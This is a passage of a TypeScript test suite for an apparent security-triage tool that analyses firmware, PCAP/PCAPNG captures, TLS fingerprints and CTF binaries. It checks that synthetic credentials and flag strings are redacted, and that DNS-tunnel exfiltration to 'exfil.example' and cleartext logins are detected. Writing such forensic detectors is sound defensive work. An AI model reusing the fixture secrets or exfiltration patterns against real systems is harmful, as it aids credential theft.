			attackSurface.claimLedger.some(
				(claim) => claim.claimType === "firmware-exposed-management-surface" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			attackSurface.claimLedger.some(
				(claim) => claim.claimType === "firmware-management-credential-pivot" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			attackSurface.promotionReport.promotedClaims.some(
				(claim) => claim.claimType === "firmware-management-credential-pivot",
			),
		).toBe(true);
		expect(summary.signatures.map((signature) => signature.name)).toEqual(
			expect.arrayContaining(["TRX", "SquashFS-little", "UBI"]),
		);
		expect(summary.structures.trx[0]).toMatchObject({
			length: 0x300,
			version: 2,
			partitionOffsets: [0x40, 0xb0, 0x100],
		});
		expect(summary.structures.trx[0].partitions[0]).toMatchObject({ absoluteOffset: 0x40, size: 0x70 });
		expect(summary.structures.squashfs[0]).toMatchObject({
			endian: "little",
			inodes: 42,
			blockSize: 131_072,
			compressionName: "xz",
			version: "4.0",
			bytesUsed: 0x2222,
		});
		expect(summary.structures.ubi[0]).toMatchObject({
			version: 1,
			eraseCount: 9,
			vidHeaderOffset: 64,
			dataOffset: 128,
			imageSequence: 0x55667788,
		});
		expect(summary.risks).toEqual(
			expect.arrayContaining([
				"hardcoded-credential-signal",
				"network-endpoint-signal",
				"exposed-service-or-web-admin-signal",
				"filesystem-init-credential-surface",
				"rootfs-signature-present",
				"firmware-container-header-parsed",
				"filesystem-superblock-parsed",
				"ubi-header-parsed",
			]),
		);
		expect(summary.stringScan.signals.credentials.some((row) => row.text.includes("<redacted>"))).toBe(true);
		expect(summary.stringScan.signals.urls.some((row) => row.text.includes("access_token=<redacted>"))).toBe(true);
		expect(summary.stringScan.signals.services.some((row) => row.text.includes("dropbear"))).toBe(true);
		expect(summary.stringScan.signals.paths.some((row) => row.text.includes("/etc/passwd"))).toBe(true);
		const plan = readFileSync(planPath, "utf8");
		expect(plan).toContain("binwalk -Me");
		expect(plan).toContain("unblob");
		expect(plan).toContain("repi-firmware-carve");
		const proofMatrixPath = join(report.artifactDir, "proof-matrix.json");
		expect(existsSync(proofMatrixPath)).toBe(true);
		const proofMatrix = JSON.parse(readFileSync(proofMatrixPath, "utf8")) as {
			artifacts: Array<{ relPath: string }>;
		};
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("firmware-attack-surface.json");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("extracts bounded PCAP flow summaries without depending on tshark", () => {
		const pcapTarget = join(workspace, "traffic.pcap");
		writeFileSync(pcapTarget, minimalTcpPcap());
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, pcapTarget, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(report.target.lane).toBe("pcap-dfir");
		expect(report.commands.map((row) => row.id)).toContain("pcap-quicklook");
		expect(report.commands.find((row) => row.id === "pcap-quicklook")?.stdout).toContain("HTTP-candidate");
		expect(report.summary.anchors).toContain("pcap quicklook anchors");
		expect(report.nextQueue.some((command) => command.includes("pcap-flow-summary.json"))).toBe(true);
		const summaryPath = join(report.artifactDir, "pcap-flow-summary.json");
		expect(existsSync(summaryPath)).toBe(true);
		expect(statSync(summaryPath).mode & 0o777).toBe(0o600);
		const summary = JSON.parse(readFileSync(summaryPath, "utf8")) as {
			packetCount: number;
			protocols: Record<string, number>;
			flows: Array<{ proto: string; src: string; dst: string; sport: number; dport: number }>;
		};
		expect(summary.packetCount).toBe(1);
		expect(summary.protocols.TCP).toBe(1);
		expect(summary.flows[0]).toMatchObject({
			proto: "TCP",
			src: "10.0.0.1",
			dst: "10.0.0.2",
			sport: 12345,
			dport: 80,
		});
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("extracts PCAPNG HTTP and DNS evidence without leaking query secrets", () => {
		const pcapTarget = join(workspace, "traffic.pcapng");
		writeFileSync(pcapTarget, minimalPcapngHttpDns());
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, pcapTarget, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string; stdout: string }>;
			summary: { missingCritical: string[]; anchors: string[] };
			nextQueue: string[];
		};
		expect(report.target.lane).toBe("pcap-dfir");
		expect(JSON.stringify(report)).not.toContain("superSecretTokenValue");
		expect(JSON.stringify(report)).not.toContain("flag{http_body_secret_must_not_leak}");
		expect(JSON.stringify(report)).not.toContain("flag{http_transform_secret_must_not_leak}");
		expect(JSON.stringify(report)).not.toContain("admin");
		expect(JSON.stringify(report)).not.toContain("MFRGGZDFMZTWQ2LKNNWG23TPOIXW443X");
		expect(JSON.stringify(report)).not.toContain(Buffer.from("alice:superSecretTokenValue").toString("base64"));
		expect(report.commands.find((row) => row.id === "pcap-quicklook")?.stdout).toContain("pcapng");
		expect(report.summary.missingCritical).not.toContain("tshark");
		expect(report.summary.anchors).toContain("pcap quicklook anchors");
		expect(report.summary.anchors).toContain("PCAP HTTP credential anchors");
		expect(report.summary.anchors).toContain("PCAP plaintext auth anchors");
		expect(report.summary.anchors).toContain("DNS tunnel/exfil anchors");
		expect(report.summary.anchors).toContain("PCAP HTTP object/body anchors");
		expect(report.commands.map((row) => row.id)).toContain("pcap-flow-claims");
		expect(report.nextQueue.some((command) => command.includes("bodySummary/embeddedArchives"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("pcap-flow-claims.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("claimLedger"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("pcap-http-object-verifier.py"))).toBe(true);
		expect(report.commands.map((row) => row.id)).toContain("pcap-http-object-carves");
		expect(report.commands.map((row) => row.id)).not.toContain("file-strings-head");
		expect(report.commands.find((row) => row.id === "pcap-http-object-carves")?.stdout).not.toContain(
			"flag{http_body_secret_must_not_leak}",
		);
		const summary = JSON.parse(readFileSync(join(report.artifactDir, "pcap-flow-summary.json"), "utf8")) as {
			schemaVersion: number;
			format: string;
			packetCount: number;
			protocols: Record<string, number>;
			tcpStreams: Array<{
				packets: number;
				protocolHints: string[];
				http?: {
					kind: string;
					status: number;
					headers: {
						contentType: string;
						contentLength: number;
						contentDisposition: string;
					};
					bodySummary?: {
						bodyOffset: number;
						capturedLength: number;
						declaredLength: number;
						truncated: boolean;
						sha256: string;
						contentType: string;
						contentDisposition: string;
						magic: Array<{
							name: string;
							bodyOffset: number;
							streamOffset: number;
							sha256: string;
							risk: string;
						}>;
						embeddedArchives: Array<{
							format: string;
							offset: number;
							streamOffset: number;
							sha256: string;
							entryCount: number;
							entries: Array<{ name: string; method: number; compressedSize: number; uncompressedSize: number }>;
						}>;
						risks: string[];
					};
					risks: string[];
				};
			}>;
			http: Array<{
				kind: string;
				reassembled?: boolean;
				method?: string;
				status?: number;
				target?: string;
				host?: string;
				headers: {
					authorizationScheme?: string;
					cookieNames?: string[];
					contentType?: string;
					userAgent?: string;
					location?: string;
					setCookieNames?: string[];
				};
				bodySummary?: { embeddedArchives: Array<{ entries: Array<{ name: string }> }> };
				credentialSignals: Array<{
					kind: string;
					name?: string;
					scheme?: string;
					valueSha256: string;
					valueLength: number;
				}>;
				risks: string[];
			}>;
			dns: Array<{ name: string; type: string }>;
			dnsAnswers: Array<{ section: string; name: string; type: string; ttl: number; value: string }>;
			dnsTunnels: Array<{
				baseDomain: string;
				queryCount: number;
				maxLabelLength: number;
				maxEntropy: number;
				risks: string[];
				samples: string[];
				labelSha256s: string[];
			}>;
			plaintextAuth: Array<{
				kind: string;
				protocol: string;
				commands: string[];
				credentialSignals: Array<{
					kind: string;
					protocol: string;
					field: string;
					valueSha256: string;
					valueLength: number;
				}>;
				risks: string[];
			}>;
		};
		expect(summary.schemaVersion).toBeGreaterThanOrEqual(7);
		expect(summary.format).toBe("pcapng");
		expect(summary.packetCount).toBe(8);
		expect(summary.protocols["DNS-candidate"]).toBe(3);
		expect(summary.protocols["HTTP-candidate"]).toBe(4);
		expect(summary.protocols["HTTP-reassembled"]).toBe(1);
		expect(summary.dns[0]).toMatchObject({ name: "example.com", type: "A" });
		expect(summary.dnsAnswers[0]).toMatchObject({
			section: "answer",
			name: "example.com",
			type: "A",
			ttl: 60,
			value: "1.2.3.4",
		});
		const exfilDns = summary.dns.find((row) => row.name.includes("<dns-label:"));
		expect(exfilDns).toMatchObject({
			name: expect.stringContaining("<dns-label:"),
			type: "A",
			risks: expect.arrayContaining([
				"pcap-dns-long-label-exfil-signal",
				"pcap-dns-high-entropy-label-signal",
				"pcap-dns-encoded-label-signal",
			]),
			queryAnalysis: expect.objectContaining({
				baseDomain: "exfil.example",
				maxLabelLength: 32,
				labelSignals: expect.arrayContaining([
					expect.objectContaining({
						length: 32,
						valueSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
					}),
				]),
			}),
		});
		expect(summary.dnsTunnels[0]).toMatchObject({
			baseDomain: "exfil.example",
			queryCount: 1,
			maxLabelLength: 32,
			risks: expect.arrayContaining(["pcap-dns-long-label-exfil-signal", "pcap-dns-encoded-label-signal"]),
			samples: [expect.stringContaining("<dns-label:")],
			labelSha256s: [expect.stringMatching(/^[a-f0-9]{64}$/)],
		});
		expect(summary.http[0]).toMatchObject({
			kind: "request",
			method: "POST",
			target: "/api/orders?access_token=<redacted>",
			host: "example.local",
		});
		expect(summary.http[0].headers).toMatchObject({
			authorizationScheme: "Basic",
			cookieNames: expect.arrayContaining(["sid", "theme"]),
			contentType: "application/x-www-form-urlencoded",
			userAgent: "repi-test",
		});
		expect(summary.http[0].credentialSignals).toEqual(
			expect.arrayContaining([
				expect.objectContaining({
					kind: "authorization",
					scheme: "Basic",
					valueSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
					valueLength: expect.any(Number),
				}),
				expect.objectContaining({
					kind: "cookie",
					name: "sid",
					valueSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
				}),
				expect.objectContaining({
					kind: "query-param",
					name: "access_token",
					valueSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
				}),
				expect.objectContaining({
					kind: "form-field",
					name: "password",
					valueSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
				}),
			]),
		);
		expect(summary.http[0].risks).toEqual(
			expect.arrayContaining([
				"pcap-http-authorization-header",
				"pcap-http-basic-auth",
				"pcap-http-cookie-session",
				"pcap-http-query-token",
				"pcap-http-form-credential",
				"pcap-http-cleartext-credential-flow",
			]),
		);
		expect(summary.http[1]).toMatchObject({
			kind: "response",
			status: 302,
			headers: {
				location: "/next?token=<redacted>",
				setCookieNames: ["session"],
			},
		});
		expect(summary.http[1].credentialSignals).toEqual(
			expect.arrayContaining([
				expect.objectContaining({
					kind: "set-cookie",
					name: "session",
					valueSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
				}),
				expect.objectContaining({
					kind: "query-param",
					name: "token",
					valueSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
				}),
			]),
		);
		expect(summary.http[1].risks).toEqual(
			expect.arrayContaining([
				"pcap-http-set-cookie-session",
				"pcap-http-query-token",
				"pcap-http-cleartext-credential-flow",
			]),
		);
		expect(summary.plaintextAuth[0]).toMatchObject({
			kind: "plaintext-auth",
			protocol: "ftp",
			commands: ["USER", "PASS"],
			risks: expect.arrayContaining(["pcap-plaintext-auth", "pcap-plaintext-auth-ftp"]),
		});
		expect(summary.plaintextAuth[0].credentialSignals).toEqual(
			expect.arrayContaining([
				expect.objectContaining({
					kind: "plaintext-auth-field",
					field: "username",
					valueSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
				}),
				expect.objectContaining({
					kind: "plaintext-auth-field",
					field: "password",
					valueSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
				}),
			]),
		);
		const objectStream = summary.tcpStreams.find((row) =>
			row.http?.bodySummary?.embeddedArchives?.some((archive) => archive.entryCount === 2),
		);
		expect(objectStream).toMatchObject({
			packets: 2,
			protocolHints: expect.arrayContaining(["HTTP"]),
			http: {
				kind: "response",
				status: 200,
				headers: {
					contentType: "application/zip",
					contentDisposition: 'attachment; filename="loot.zip"',
				},
			},
		});
		expect(objectStream?.http?.bodySummary).toMatchObject({
			bodyOffset: expect.any(Number),
			capturedLength: expect.any(Number),
			declaredLength: expect.any(Number),
			truncated: false,
			sha256: expect.stringMatching(/^[a-f0-9]{64}$/),
			contentType: "application/zip",
			contentDisposition: 'attachment; filename="loot.zip"',
			magic: expect.arrayContaining([
				expect.objectContaining({
					name: "ZIP",
					bodyOffset: 0,
					streamOffset: expect.any(Number),
					sha256: expect.stringMatching(/^[a-f0-9]{64}$/),
					risk: "pcap-http-embedded-zip-object",
				}),
			]),
			embeddedArchives: [
				expect.objectContaining({
					format: "zip",
					offset: 0,
					streamOffset: expect.any(Number),
					entryCount: 2,
					entries: expect.arrayContaining([
						expect.objectContaining({
							name: "objects/flag.txt",
							method: 0,
							compressedSize: "flag{http_body_secret_must_not_leak}".length,
							uncompressedSize: "flag{http_body_secret_must_not_leak}".length,
						}),
						expect.objectContaining({
							name: "encoded/base64.txt",
							method: 0,
						}),
					]),
				}),
			],
			risks: expect.arrayContaining([
				"pcap-http-object-body",
				"pcap-http-embedded-zip-object",
				"pcap-http-embedded-archive-parsed",
			]),
		});
		expect(objectStream?.http?.risks).toEqual(
			expect.arrayContaining([
				"pcap-http-object-body",
				"pcap-http-embedded-zip-object",
				"pcap-http-embedded-archive-parsed",
			]),
		);
		expect(
			summary.http.some(
				(row) =>
					row.reassembled && row.bodySummary?.embeddedArchives?.[0]?.entries?.[0]?.name === "objects/flag.txt",
			),
		).toBe(true);
		const objectManifestPath = join(report.artifactDir, "pcap-http-objects.json");
		const flowClaimsPath = join(report.artifactDir, "pcap-flow-claims.json");
		expect(existsSync(objectManifestPath)).toBe(true);
		expect(existsSync(flowClaimsPath)).toBe(true);
		expect(statSync(objectManifestPath).mode & 0o777).toBe(0o600);
		expect(statSync(flowClaimsPath).mode & 0o777).toBe(0o600);
		const objectManifest = JSON.parse(readFileSync(objectManifestPath, "utf8")) as {
			kind: string;
			objectCount: number;
			entryCount: number;
			decodedCount: number;
			verifierRelPath: string;
			objects: Array<{
				artifactRelPath: string;
				size: number;
				sha256: string;
				firstFrame: number;
				lastFrame: number;
				magic: Array<{ name: string }>;
				decodedArtifacts: Array<{
					chain: string[];
					artifactRelPath: string;
					size: number;
					sha256: string;
				}>;
				extractedEntries: Array<{
					name: string;
					artifactRelPath: string;
					size: number;
					sha256: string;
					decodedArtifacts: Array<{
						chain: string[];
						artifactRelPath: string;
						size: number;
						sha256: string;
						interesting: boolean;
					}>;
				}>;
			}>;
		};
		const flowClaims = JSON.parse(readFileSync(flowClaimsPath, "utf8")) as {
			proofReady: boolean;
			claimLedger: Array<{ claimType: string; verdict: string; evidenceBinding: Record<string, unknown> }>;
			composedPaths: Array<{ claimType: string; verdict: string }>;
			promotionReport: { promotedClaims: Array<{ claimType: string }> };
			repairQueue: Array<{ blocker: string }>;
		};
		expect(JSON.stringify(flowClaims)).not.toContain("superSecretTokenValue");
		expect(JSON.stringify(flowClaims)).not.toContain("flag{http_body_secret_must_not_leak}");
		expect(JSON.stringify(flowClaims)).not.toContain("flag{http_transform_secret_must_not_leak}");
		expect(JSON.stringify(flowClaims)).not.toContain("admin");
		expect(flowClaims.proofReady).toBe(true);
		expect(
			flowClaims.claimLedger.some(
				(claim) => claim.claimType === "pcap-http-credential-flow" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			flowClaims.claimLedger.some(
				(claim) => claim.claimType === "pcap-plaintext-auth-flow" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			flowClaims.claimLedger.some(
				(claim) => claim.claimType === "pcap-dns-tunnel-exfil-candidate" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			flowClaims.claimLedger.some(
				(claim) => claim.claimType === "pcap-http-object-carve" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			flowClaims.claimLedger.some(
				(claim) => claim.claimType === "pcap-http-decoded-artifact" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			flowClaims.claimLedger.some(
				(claim) => claim.claimType === "pcap-flow-evidence-pivot" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			flowClaims.promotionReport.promotedClaims.some((claim) => claim.claimType === "pcap-flow-evidence-pivot"),
		).toBe(true);
		expect(JSON.stringify(objectManifest)).not.toContain("flag{http_body_secret_must_not_leak}");
		expect(JSON.stringify(objectManifest)).not.toContain("flag{http_transform_secret_must_not_leak}");
		expect(objectManifest).toMatchObject({
			kind: "repi-pcap-http-object-carves",
			objectCount: 1,
			entryCount: 2,
			decodedCount: 1,
			objects: [
				expect.objectContaining({
					firstFrame: expect.any(Number),
					lastFrame: expect.any(Number),
					magic: expect.arrayContaining([expect.objectContaining({ name: "ZIP" })]),
				}),
			],
		});
		const carvedObjectPath = join(report.artifactDir, objectManifest.objects[0].artifactRelPath);
		expect(existsSync(carvedObjectPath)).toBe(true);
		expect(statSync(carvedObjectPath).mode & 0o777).toBe(0o600);
		expect(readFileSync(carvedObjectPath).includes(Buffer.from("flag{http_body_secret_must_not_leak}"))).toBe(true);
		expect(objectManifest.objects[0].extractedEntries[0]).toMatchObject({
			name: "objects/flag.txt",
			artifactRelPath: expect.stringContaining("objects/flag.txt"),
			size: "flag{http_body_secret_must_not_leak}".length,
			sha256: expect.stringMatching(/^[a-f0-9]{64}$/),
		});
		const carvedEntryPath = join(report.artifactDir, objectManifest.objects[0].extractedEntries[0].artifactRelPath);
		expect(existsSync(carvedEntryPath)).toBe(true);
		expect(statSync(carvedEntryPath).mode & 0o777).toBe(0o600);
		expect(readFileSync(carvedEntryPath, "utf8")).toBe("flag{http_body_secret_must_not_leak}");
		const encodedEntry = objectManifest.objects[0].extractedEntries.find(
			(entry) => entry.name === "encoded/base64.txt",
		);
		expect(encodedEntry).toBeTruthy();
		expect(encodedEntry?.decodedArtifacts).toEqual([
			expect.objectContaining({
				chain: ["base64"],
				size: "flag{http_transform_secret_must_not_leak}".length,
				sha256: expect.stringMatching(/^[a-f0-9]{64}$/),
				interesting: true,
			}),
		]);
		const decodedEntryPath = join(report.artifactDir, encodedEntry?.decodedArtifacts[0].artifactRelPath ?? "");
		expect(existsSync(decodedEntryPath)).toBe(true);
		expect(statSync(decodedEntryPath).mode & 0o777).toBe(0o600);
		expect(readFileSync(decodedEntryPath, "utf8")).toBe("flag{http_transform_secret_must_not_leak}");
		const verifier = spawnSync(join(report.artifactDir, objectManifest.verifierRelPath), [objectManifestPath], {
			encoding: "utf8",
			timeout: 5000,
		});
		expect(verifier.status, `${verifier.stderr}\n${verifier.stdout}`).toBe(0);
		expect(verifier.stdout).toContain("verdict: pass objects=1 entries=2 decoded=1");
		expect(verifier.stdout).not.toContain("flag{http_body_secret_must_not_leak}");
		expect(verifier.stdout).not.toContain("flag{http_transform_secret_must_not_leak}");
		const proofMatrixPath = join(report.artifactDir, "proof-matrix.json");
		expect(existsSync(proofMatrixPath)).toBe(true);
		const proofMatrix = JSON.parse(readFileSync(proofMatrixPath, "utf8")) as {
			artifacts: Array<{ relPath: string }>;
		};
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("pcap-flow-claims.json");
		expect(JSON.stringify(summary)).not.toContain("superSecretTokenValue");
		expect(JSON.stringify(summary)).not.toContain("flag{http_body_secret_must_not_leak}");
		expect(JSON.stringify(summary)).not.toContain("flag{http_transform_secret_must_not_leak}");
		expect(JSON.stringify(summary)).not.toContain("admin");
		expect(JSON.stringify(summary)).not.toContain(Buffer.from("alice:superSecretTokenValue").toString("base64"));
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("reassembles out-of-order split TCP HTTP payloads into credential evidence", () => {
		const pcapTarget = join(workspace, "traffic-split-http.pcapng");
		writeFileSync(pcapTarget, minimalPcapngSplitHttp());
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, pcapTarget, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			summary: { anchors: string[] };
			nextQueue: string[];
		};
		expect(report.target.lane).toBe("pcap-dfir");
		expect(JSON.stringify(report)).not.toContain("splitSecretBearerValue");
		expect(JSON.stringify(report)).not.toContain("splitSecretCookieValue");
		expect(JSON.stringify(report)).not.toContain("splitSecretFormValue");
		expect(report.summary.anchors).toContain("TCP reassembly anchors");
		expect(report.summary.anchors).toContain("PCAP HTTP credential anchors");
		expect(report.nextQueue.some((command) => command.includes("flows/tcpStreams"))).toBe(true);
		const summary = JSON.parse(readFileSync(join(report.artifactDir, "pcap-flow-summary.json"), "utf8")) as {
			packetCount: number;
			protocols: Record<string, number>;
			tcpStreams: Array<{
				packets: number;
				payloadBytes: number;
				reassembledBytes: number;
				reassembly: {
					strategy: string;
					outOfOrder: boolean;
					firstSeq: number;
					lastSeq: number;
					gaps: unknown[];
					overlaps: unknown[];
				};
				protocolHints: string[];
				payloadSha256: string;
				http: {
					kind: string;
					method: string;
					target: string;
					headers: { authorizationScheme: string; cookieNames: string[] };
					credentialSignals: Array<{ kind: string; name?: string; scheme?: string; valueSha256: string }>;
					risks: string[];
				};
			}>;
			http: Array<{
				reassembled?: boolean;
				method?: string;
				target?: string;
				headers?: { authorizationScheme?: string; cookieNames?: string[] };
				credentialSignals?: Array<{ kind: string; name?: string; scheme?: string; valueSha256: string }>;
				risks?: string[];
			}>;
		};
		expect(summary.packetCount).toBe(2);
		expect(summary.protocols["TCP-reassembled"]).toBe(1);
		expect(summary.protocols["HTTP-reassembled"]).toBe(1);
		const stream = summary.tcpStreams.find((row) => row.protocolHints.includes("HTTP"));
		expect(stream).toMatchObject({
			packets: 2,
			reassembledBytes: expect.any(Number),
			reassembly: {
				strategy: "tcp-sequence",
				outOfOrder: true,
				firstSeq: 10_000,
				lastSeq:
					10_000 +
					Buffer.byteLength(
						[
							"POST /login HTTP/1.1",
							"Host: split.local",
							"Authorization: Bearer splitSecretBearerValue",
							"Cookie: sid=splitSecretCookieValue; theme=light",
							"Content-Type: application/x-www-form-urlencoded",
							"",
							"user=alice&",
						].join("\r\n"),
					),
				gaps: [],
				overlaps: [],
			},
			payloadSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
			http: {
				kind: "request",
				method: "POST",
				target: "/login",
				headers: {
					authorizationScheme: "Bearer",
					cookieNames: expect.arrayContaining(["sid", "theme"]),
				},
				risks: expect.arrayContaining([
					"pcap-http-authorization-header",
					"pcap-http-bearer-token",
					"pcap-http-cookie-session",
					"pcap-http-form-credential",
				]),
			},
		});
		expect(stream?.http.credentialSignals).toEqual(
			expect.arrayContaining([
				expect.objectContaining({
					kind: "authorization",
					scheme: "Bearer",
					valueSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
				}),
				expect.objectContaining({
					kind: "cookie",
					name: "sid",
					valueSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
				}),
				expect.objectContaining({
					kind: "form-field",
					name: "password",
					valueSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
				}),
			]),
		);
		const reassembledHttp = summary.http.find((row) => row.reassembled);
		expect(reassembledHttp).toMatchObject({
			method: "POST",
			target: "/login",
			headers: {
				authorizationScheme: "Bearer",
			},
		});
		expect(JSON.stringify(summary)).not.toContain("splitSecretBearerValue");
		expect(JSON.stringify(summary)).not.toContain("splitSecretCookieValue");
		expect(JSON.stringify(summary)).not.toContain("splitSecretFormValue");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("extracts PCAPNG TLS ClientHello SNI and ALPN evidence without tshark", () => {
		const pcapTarget = join(workspace, "traffic-tls.pcapng");
		writeFileSync(pcapTarget, minimalPcapngTls());
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, pcapTarget, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(report.target.lane).toBe("pcap-dfir");
		const quicklook = report.commands.find((row) => row.id === "pcap-quicklook")?.stdout ?? "";
		expect(quicklook).toContain("TLS-candidate");
		expect(quicklook).toContain("api.example.local");
		expect(quicklook).toContain("31568627b85ab03718a5cedd6691fe07");
		expect(report.summary.anchors).toContain("TLS/SNI anchors");
		expect(report.nextQueue.some((command) => command.includes("http/dns/tls SNI samples"))).toBe(true);
		const summary = JSON.parse(readFileSync(join(report.artifactDir, "pcap-flow-summary.json"), "utf8")) as {
			format: string;
			packetCount: number;
			protocols: Record<string, number>;
			tls: Array<{
				kind: string;
				sni: string[];
				alpn: string[];
				recordVersion: string;
				clientVersion: string;
				cipherSuites: string[];
				extensions: string[];
				supportedGroups: string[];
				ecPointFormats: number[];
				ja3: string;
				ja3Hash: string;
			}>;
		};
		expect(summary.format).toBe("pcapng");
		expect(summary.packetCount).toBe(1);
		expect(summary.protocols["TLS-candidate"]).toBe(1);
		expect(summary.tls[0]).toMatchObject({
			kind: "client-hello",
			recordVersion: "0x0301",
			clientVersion: "0x0303",
			cipherSuites: ["0x1301"],
			extensions: ["0x0000", "0x000a", "0x000b", "0x0010"],
			supportedGroups: ["0x001d", "0x0017"],
			ecPointFormats: [0],
			ja3: "771,4865,0-10-11-16,29-23,0",
			ja3Hash: "31568627b85ab03718a5cedd6691fe07",
			sni: ["api.example.local"],
			alpn: ["h2", "http/1.1"],
		});
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("promotes representative artifacts inside challenge directories into specialist probes", () => {
		const challengeDir = join(workspace, "pwn-challenge");
		mkdirSync(challengeDir, { recursive: true });
		const binary = join(challengeDir, "vuln.elf");
		writeFileSync(binary, Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, ...new Array(64).fill(0)]));

		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, challengeDir, "--no-mission", "--no-write", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			target: { lane: string; representativePath: string };
			commands: Array<{ id: string }>;
			nextQueue: string[];
		};
		expect(report.target.lane).toBe("native-pwn");
		expect(report.target.representativePath).toBe(binary);
		expect(report.commands.map((row) => row.id)).toContain("representative-file-stat");
		expect(report.nextQueue.some((command) => command.includes("vuln.elf"))).toBe(true);
	});

	it("finds specialist artifacts in nested challenge release folders", () => {
		const challengeDir = join(workspace, "nested-pwn-challenge");
		const releaseDir = join(challengeDir, "dist", "release");
		mkdirSync(releaseDir, { recursive: true });
		const binary = join(releaseDir, "chall.elf");
		writeFileSync(binary, Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, ...new Array(64).fill(0)]));

		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, challengeDir, "--no-mission", "--no-write", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			target: { lane: string; representativePath: string };
			commands: Array<{ id: string }>;
			nextQueue: string[];
		};
		expect(report.target.lane).toBe("native-pwn");
		expect(report.target.representativePath).toBe(binary);
		expect(report.commands.map((row) => row.id)).toContain("representative-file-stat");
		expect(report.nextQueue.some((command) => command.includes("chall.elf"))).toBe(true);
	});

	it("summarizes ELF hardening without depending on checksec", () => {
		const binary = join(workspace, "hardened.elf");
		writeFileSync(binary, minimalElf64Hardening());

		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, binary, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(report.commands.map((row) => row.id)).toContain("native-elf-hardening");
		expect(report.commands.map((row) => row.id)).toContain("native-static-triage");
		expect(report.commands.map((row) => row.id)).toContain("native-exploit-hypotheses");
		expect(report.commands.map((row) => row.id)).toContain("native-primitive-claims");
		expect(report.commands.find((row) => row.id === "native-elf-hardening")?.stdout).toContain(
			"repi-native-elf-hardening",
		);
		expect(report.summary.anchors).toContain("native hardening anchors");
		expect(report.summary.anchors).toContain("native ELF import/relocation anchors");
		expect(report.summary.anchors).toContain("native static sink anchors");
